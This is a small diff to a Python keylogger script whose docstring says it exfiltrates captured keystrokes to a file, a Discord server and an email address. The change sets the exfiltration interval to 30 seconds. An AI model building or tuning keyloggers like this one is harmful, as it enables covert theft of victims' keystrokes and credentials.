@@ -14,8 +14,8 @@ on a Linux system to exfiltrate information to a text file, a Discord
 server and an email address (as well as to the screen for debugging 
 purposes). All credentials are invalid and serve as mere examples.'''
 
-# Setting up the Keylogger to exfiltrate data every 120 seconds
-keylogger = KeyLogger(exfil_time=12)
+# Setting up the Keylogger to exfiltrate data every 30 seconds
+keylogger = KeyLogger(exfil_time=30)
 
 # Enabling output of logs to STDOUT
 Screen(keylogger=keylogger)
